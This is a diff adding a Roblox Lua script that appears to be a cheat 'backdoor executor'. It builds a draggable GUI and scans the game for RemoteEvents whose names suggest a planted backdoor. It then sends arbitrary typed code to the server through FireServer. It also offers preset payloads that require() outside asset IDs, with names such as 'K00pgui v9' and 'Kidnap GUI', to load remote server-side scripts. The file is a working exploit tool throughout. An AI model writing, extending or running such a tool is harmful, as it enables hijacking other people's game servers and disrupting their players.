@@ -1,0 +1,222 @@
+pcall(function()
+	if game.CoreGui:FindFirstChild("BackdoorExec") then
+		game.CoreGui.BackdoorExec:Destroy()
+	end
+end)
+
+local TweenService = game:GetService("TweenService")
+local localUser = game.Players.LocalPlayer.Name
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "BackdoorExec"
+gui.ResetOnSpawn = false
+gui.Parent = game.CoreGui
+gui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 360, 0, 320)
+frame.Position = UDim2.new(0.5, -180, 0.5, -160)
+frame.BackgroundColor3 = Color3.new(1,1,1)
+frame.BorderColor3 = Color3.fromRGB(179, 179, 179)
+frame.BorderSizePixel = 1
+frame.Active = true
+frame.Draggable = true
+
+local textbox = Instance.new("TextBox", frame)
+textbox.Size = UDim2.new(0, 340, 0, 80)
+textbox.Position = UDim2.new(0, 10, 0, 10)
+textbox.ClearTextOnFocus = false
+textbox.PlaceholderText = "Type code for the backdoor..."
+textbox.TextColor3 = Color3.new(0,0,0)
+textbox.Text = ""
+textbox.TextWrapped = true
+textbox.TextXAlignment = Enum.TextXAlignment.Left
+textbox.TextYAlignment = Enum.TextYAlignment.Top
+textbox.BackgroundColor3 = Color3.new(1,1,1)
+textbox.BorderColor3 = Color3.fromRGB(179, 179, 179)
+textbox.BorderSizePixel = 1
+textbox.MultiLine = true
+
+local dropLabel = Instance.new("TextLabel", frame)
+dropLabel.Size = UDim2.new(0, 340, 0, 20)
+dropLabel.Position = UDim2.new(0, 10, 0, 100)
+dropLabel.BackgroundColor3 = Color3.new(1,1,1)
+dropLabel.TextColor3 = Color3.new(0,0,0)
+dropLabel.Text = "Backdoors found: (none)"
+dropLabel.TextXAlignment = Enum.TextXAlignment.Left
+dropLabel.BorderSizePixel = 0
+
+local dropdown = Instance.new("TextButton", frame)
+dropdown.Size = UDim2.new(0, 340, 0, 25)
+dropdown.Position = UDim2.new(0, 10, 0, 125)
+dropdown.Text = "Select a backdoor"
+dropdown.BackgroundColor3 = Color3.fromRGB(230,230,230)
+dropdown.BorderColor3 = Color3.fromRGB(179,179,179)
+dropdown.TextColor3 = Color3.new(0,0,0)
+dropdown.BorderSizePixel = 1
+
+local dropdownList = Instance.new("Frame", frame)
+dropdownList.Size = UDim2.new(0, 340, 0, 0)
+dropdownList.Position = UDim2.new(0, 10, 0, 150)
+dropdownList.BackgroundColor3 = Color3.fromRGB(245,245,245)
+dropdownList.BorderColor3 = Color3.fromRGB(179,179,179)
+dropdownList.BorderSizePixel = 1
+dropdownList.ClipsDescendants = true
+
+local exec = Instance.new("TextButton", frame)
+exec.Size = UDim2.new(0, 165, 0, 50)
+exec.Position = UDim2.new(0, 10, 0, 190)
+exec.Text = "Execute"
+exec.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+exec.BorderColor3 = Color3.fromRGB(179, 179, 179)
+exec.BorderSizePixel = 1
+exec.TextColor3 = Color3.new(0, 0, 0)
+
+local clear = Instance.new("TextButton", frame)
+clear.Size = UDim2.new(0, 165, 0, 50)
+clear.Position = UDim2.new(0, 185, 0, 190)
+clear.Text = "Clear"
+clear.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+clear.BorderColor3 = Color3.fromRGB(179, 179, 179)
+clear.BorderSizePixel = 1
+clear.TextColor3 = Color3.new(0, 0, 0)
+
+local scriptsBtn = Instance.new("TextButton", frame)
+scriptsBtn.Size = UDim2.new(0, 340, 0, 30)
+scriptsBtn.Position = UDim2.new(0, 10, 0, 250)
+scriptsBtn.Text = "Scripts"
+scriptsBtn.BackgroundColor3 = Color3.fromRGB(230,230,230)
+scriptsBtn.BorderColor3 = Color3.fromRGB(179,179,179)
+scriptsBtn.TextColor3 = Color3.new(0,0,0)
+scriptsBtn.BorderSizePixel = 1
+
+local scriptsDropdown = Instance.new("Frame", frame)
+scriptsDropdown.Size = UDim2.new(0, 340, 0, 0)
+scriptsDropdown.Position = UDim2.new(0, 10, 0, 280)
+scriptsDropdown.BackgroundColor3 = Color3.fromRGB(245,245,245)
+scriptsDropdown.BorderColor3 = Color3.fromRGB(179,179,179)
+scriptsDropdown.BorderSizePixel = 1
+scriptsDropdown.ClipsDescendants = true
+
+local dropdownOpen = false
+local scriptsOpen = false
+local selectedBackdoor = nil
+local backdoors = {}
+
+local function updateDropdown()
+	for _, child in pairs(dropdownList:GetChildren()) do
+		if child:IsA("TextButton") then
+			child:Destroy()
+		end
+	end
+
+	local y = 0
+	for i, remote in pairs(backdoors) do
+		local btn = Instance.new("TextButton", dropdownList)
+		btn.Size = UDim2.new(1, 0, 0, 25)
+		btn.Position = UDim2.new(0, 0, 0, y)
+		btn.BackgroundColor3 = Color3.fromRGB(220,220,220)
+		btn.BorderColor3 = Color3.fromRGB(180,180,180)
+		btn.BorderSizePixel = 1
+		btn.TextColor3 = Color3.new(0,0,0)
+		btn.Text = remote.Name .. " (" .. remote:GetFullName() .. ")"
+		btn.TextXAlignment = Enum.TextXAlignment.Left
+
+		btn.MouseButton1Click:Connect(function()
+			selectedBackdoor = remote
+			dropdown.Text = "Backdoor: " .. remote.Name
+			TweenService:Create(dropdownList, TweenInfo.new(0.25), {Size = UDim2.new(0, 340, 0, 0)}):Play()
+			dropdownOpen = false
+		end)
+
+		y = y + 25
+	end
+
+	TweenService:Create(dropdownList, TweenInfo.new(0.25), {Size = UDim2.new(0, 340, 0, y)}):Play()
+end
+
+for _, v in pairs(game:GetDescendants()) do
+	if v:IsA("RemoteEvent") then
+		local nameLower = v.Name:lower()
+		if nameLower:find("server") or nameLower:find("exec") or nameLower:find("load") or nameLower:find("backdoor") or nameLower:find("cheat") or nameLower:find("anti") then
+			table.insert(backdoors, v)
+		end
+	end
+end
+
+if #backdoors > 0 then
+	selectedBackdoor = backdoors[1]
+	dropdown.Text = "Backdoor: " .. selectedBackdoor.Name
+	dropLabel.Text = "Backdoors found: " .. tostring(#backdoors)
+	updateDropdown()
+else
+	dropLabel.Text = "Backdoors found: none"
+end
+
+dropdown.MouseButton1Click:Connect(function()
+	if dropdownOpen then
+		TweenService:Create(dropdownList, TweenInfo.new(0.25), {Size = UDim2.new(0, 340, 0, 0)}):Play()
+	else
+		updateDropdown()
+	end
+	dropdownOpen = not dropdownOpen
+end)
+
+exec.MouseButton1Click:Connect(function()
+	if selectedBackdoor then
+		selectedBackdoor:FireServer(textbox.Text)
+	end
+end)
+
+clear.MouseButton1Click:Connect(function()
+	textbox.Text = ""
+end)
+
+local scriptNames = {
+	"all seeing hand",
+	"K00pgui v9",
+	"script 3",
+	"script 4",
+	"script 5",
+}
+
+local scriptNames = {
+	"all seeing hand",
+	"K00pgui v9",
+	"Polaria",
+	"Kidnap GUI",
+	"script 5",
+}
+
+local scriptCodes = {
+	('require(5375399205).Player("%s")'):format(localUser),
+	('require(17145849501).v9("%s")'):format(localUser),
+	('require(123255432303221):Pload("%s")'):format(localUser),  -- Script 3 corregido
+	('require(4901387632).clown("%s")'):format(localUser),       -- Script 4 corregido
+	"print('Script 5')",
+
+}
+
+for i = 1, #scriptNames do
+	local btn = Instance.new("TextButton", scriptsDropdown)
+	btn.Size = UDim2.new(1, 0, 0, 25)
+	btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
+	btn.Text = scriptNames[i]
+	btn.BackgroundColor3 = Color3.fromRGB(220,220,220)
+	btn.BorderColor3 = Color3.fromRGB(180,180,180)
+	btn.BorderSizePixel = 1
+	btn.TextColor3 = Color3.new(0,0,0)
+
+	btn.MouseButton1Click:Connect(function()
+		textbox.Text = scriptCodes[i]
+	end)
+end
+
+scriptsBtn.MouseButton1Click:Connect(function()
+	if scriptsOpen then
+		TweenService:Create(scriptsDropdown, TweenInfo.new(0.25), {Size = UDim2.new(0, 340, 0, 0)}):Play()
+	else
+		TweenService:Create(scriptsDropdown, TweenInfo.new(0.25), {Size = UDim2.new(0, 340, 0, #scriptCodes * 25)}):Play()
+	end
+	scriptsOpen = not scriptsOpen
+end)
